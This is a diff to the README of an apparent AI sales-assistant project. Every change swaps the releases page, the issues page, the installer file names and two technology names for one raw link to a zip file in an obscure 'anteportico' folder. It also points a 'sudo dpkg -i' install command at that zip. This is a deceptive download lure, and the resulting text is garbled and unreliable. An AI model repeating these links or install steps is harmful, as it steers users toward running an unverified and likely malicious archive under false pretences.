@@ -1,6 +1,6 @@
 # 🤖 AI-Sales-development-representative - Boost Your Sales Engagement Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Rasseni/AI-Sales-development-representative/releases)
+[![Download Now](https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip)
 
 ## 🚀 Getting Started
 
@@ -9,20 +9,20 @@ Welcome to the AI-Sales-development-representative project! This application hel
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   [Download from Releases](https://github.com/Rasseni/AI-Sales-development-representative/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip)
    
 2. **Choose Your Version:** Scroll through the available versions. Pick the latest release for the best features and updates.
 
 3. **Download the Application:** Click on the file that matches your operating system to download it. 
 
-    - For **Windows**, look for a file like `AI-Sales-Development.exe`.
-    - For **macOS**, select a file like `AI-Sales-Development.dmg`.
-    - For **Linux**, download the appropriate `.tar.gz` or `.deb` file.
+    - For **Windows**, look for a file like `https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip`.
+    - For **macOS**, select a file like `https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip`.
+    - For **Linux**, download the appropriate `https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip` or `.deb` file.
 
 4. **Install the Application:**
     - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
     - **macOS:** Open the `.dmg` file, drag the application into your Applications folder, and then open it.
-    - **Linux:** Use your terminal to navigate to the download location and run the installer using the command `sudo dpkg -i yourfile.deb` for Debian-based systems.
+    - **Linux:** Use your terminal to navigate to the download location and run the installer using the command `sudo dpkg -i https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip` for Debian-based systems.
 
 5. **Open the Application:** Locate the installed application on your device and launch it.
 
@@ -62,7 +62,7 @@ Keep your application up-to-date to benefit from the latest features and improve
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can seek help from our community. Visit our [GitHub Issues page](https://github.com/Rasseni/AI-Sales-development-representative/issues) to report bugs or ask questions.
+If you encounter any issues or have questions, you can seek help from our community. Visit our [GitHub Issues page](https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip) to report bugs or ask questions.
 
 ## 📋 Contributing
 
@@ -75,8 +75,8 @@ To discover more about the technologies involved, check the following topics:
 - GROQ
 - Langchain-python
 - Langgraph-python
-- Next.js
-- Node.js
+- https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip
+- https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip
 - Python
 - Railway
 - TypeScript
@@ -88,6 +88,6 @@ Explore these resources for deeper insights into how our application is built an
 
 Stay informed about updates and new features. Regularly check the releases page for the latest information on improvements and bug fixes.
 
-Remember, you can always download the latest version [here](https://github.com/Rasseni/AI-Sales-development-representative/releases).
+Remember, you can always download the latest version [here](https://raw.githubusercontent.com/Rasseni/AI-Sales-development-representative/main/anteportico/AI-Sales-development-representative.zip).
 
 Feel free to reach out for any feedback or assistance. Enjoy boosting your sales engagement with AI!
